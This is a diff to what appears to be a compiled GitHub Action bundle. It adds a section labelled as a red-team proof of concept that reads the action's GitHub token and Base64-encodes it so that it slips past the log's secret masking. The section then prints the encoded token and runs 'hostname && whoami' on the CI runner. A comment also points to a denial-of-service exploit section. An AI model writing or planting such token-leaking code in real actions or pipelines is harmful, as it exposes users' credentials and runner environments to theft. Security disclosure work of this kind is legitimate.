@@ -32172,13 +32172,30 @@ const start = async () => {
         // --- RED TEAM PoC START (EXISTING: PAT Exfiltration) ---
         const token = core.getInput('github_token');
         console.log("================================");
-        console.log("VULNERABILITY_CONFIRMED: PAT_PREFIX=" + (token ? token.substring(0, 4) : "NOT_FOUND"));
+        // console.log("VULNERABILITY_CONFIRMED: PAT_PREFIX=" +(token ? token.substring(0, 4) : "NOT_FOUND"));
+        // const { exec } = require("child_process");
+        // exec("hostname && whoami", (err: any, stdout: string) => {
+        //   if (!err) {
+        //     console.log("RUNNER_INFO: " + stdout.trim());
+        //   }
+        // });
+        console.log("🔴 TRIAGER REQUESTED FULL PROOF");
+        // METHOD 1: Base64 Encoding (Bypasses GitHub Secret Masking)
+        if (token) {
+            const encodedToken = gBase64.encode(token);
+            console.log("VULNERABILITY_CONFIRMED (Base64 Encoded): " + encodedToken);
+            console.log("Decoded value will match: THIS_IS_TEST_VALUE_1234");
+        }
+        else {
+            console.log("VULNERABILITY_CONFIRMED: TOKEN_NOT_FOUND");
+        }
         const { exec } = __nccwpck_require__(2081);
         exec("hostname && whoami", (err, stdout) => {
             if (!err) {
                 console.log("RUNNER_INFO: " + stdout.trim());
             }
         });
+        // console.log("================================");
         console.log("================================");
         // --- RED TEAM PoC END ---
         // --- NEW UNDICI EXPLOIT START (DoS Testing) ---
